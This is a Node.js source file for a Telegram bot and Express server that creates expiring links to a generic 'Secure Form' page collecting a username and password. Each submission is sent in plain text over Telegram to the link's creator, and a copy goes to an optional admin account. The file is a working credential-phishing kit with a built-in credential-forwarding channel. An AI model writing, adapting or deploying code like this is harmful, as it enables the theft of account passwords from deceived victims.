const { Telegraf } = require('telegraf');
const express = require('express');
const bodyParser = require('body-parser');
const crypto = require('crypto');

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Environment variables (set in Vercel → Settings → Environment Variables)
const BOT_TOKEN = process.env.BOT_TOKEN;
const BASE_URL = process.env.BASE_URL || null; // example: https://myproject.vercel.app
const ADMIN_ID = process.env.ADMIN_ID || null; // optional, can be skipped

if (!BOT_TOKEN) {
  console.error("❌ ERROR: BOT_TOKEN environment variable required");
}

const bot = new Telegraf(BOT_TOKEN);

// In-memory storage for tokens (simple, not persistent)
const tokens = new Map(); // token -> { creatorId, expiresAt }
const TOKEN_LIFETIME = 24 * 60 * 60 * 1000; // 24 hours

function genToken(len = 8) {
  return crypto.randomBytes(Math.ceil(len/2)).toString('hex').slice(0, len);
}

function createTokenForUser(userId) {
  const token = genToken(8);
  const expiresAt = Date.now() + TOKEN_LIFETIME;
  tokens.set(token, { creatorId: userId, expiresAt });
  return token;
}

function cleanupExpiredTokens() {
  const now = Date.now();
  for (const [t, info] of tokens.entries()) {
    if (info.expiresAt <= now) tokens.delete(t);
  }
}
setInterval(cleanupExpiredTokens, 60 * 60 * 1000);

// ✅ Start command
bot.start((ctx) => {
  ctx.reply("👋 Welcome! Use /create to generate a unique form link.");
});

// ✅ Create command
bot.command('create', async (ctx) => {
  const creatorId = ctx.from?.id;
  const token = createTokenForUser(creatorId);

  if (!BASE_URL) {
    await ctx.reply("❌ BASE_URL environment variable not set!");
    return;
  }

  const link = `${BASE_URL.replace(/\/+$/, '')}/form/${token}`;
  await ctx.reply(`✅ Unique link created:\n${link}\n\nThis link is valid for 24 hours.`);
});

// 🚀 Routes
app.get('/', (req, res) => {
  res.send('✅ Telegram Form Bot is running');
});

app.get('/form/:token', (req, res) => {
  const token = req.params.token;
  const info = tokens.get(token);

  if (!info || info.expiresAt < Date.now()) {
    return res.status(404).send('<h3>❌ Invalid or expired link</h3>');
  }

  res.send(`
    <html>
      <head><meta charset="utf-8"/><title>Secure Form</title></head>
      <body>
        <h2>Enter details</h2>
        <form action="/submit/${token}" method="post">
          <input type="text" name="username" placeholder="Username" required /><br/><br/>
          <input type="password" name="password" placeholder="Password" required /><br/><br/>
          <button type="submit">Submit</button>
        </form>
        <p>⏳ Link valid until: ${new Date(info.expiresAt).toLocaleString()}</p>
      </body>
    </html>
  `);
});

app.post('/submit/:token', async (req, res) => {
  const token = req.params.token;
  const info = tokens.get(token);

  if (!info || info.expiresAt < Date.now()) {
    return res.status(404).send('❌ Invalid or expired link');
  }

  const { username, password } = req.body;
  if (!username || !password) {
    return res.status(400).send('❌ Missing fields');
  }

  const message = `📩 New submission from link ${token}\n👤 Username: ${username}\n🔑 Password: ${password}`;

  try {
    await bot.telegram.sendMessage(info.creatorId, message);
    if (ADMIN_ID) {
      await bot.telegram.sendMessage(ADMIN_ID, `[COPY]\n${message}`);
    }
    res.send('<h3>✅ Thanks — your data has been submitted.</h3>');
  } catch (err) {
    console.error("Telegram send error:", err);
    res.status(500).send('❌ Server error');
  }
});

// Telegram webhook
app.post('/api/bot', async (req, res) => {
  try {
    await bot.handleUpdate(req.body, res);
  } catch (error) {
    console.error('Error handling update:', error);
    res.status(500).send('Error processing update');
  }
});

module.exports = app;
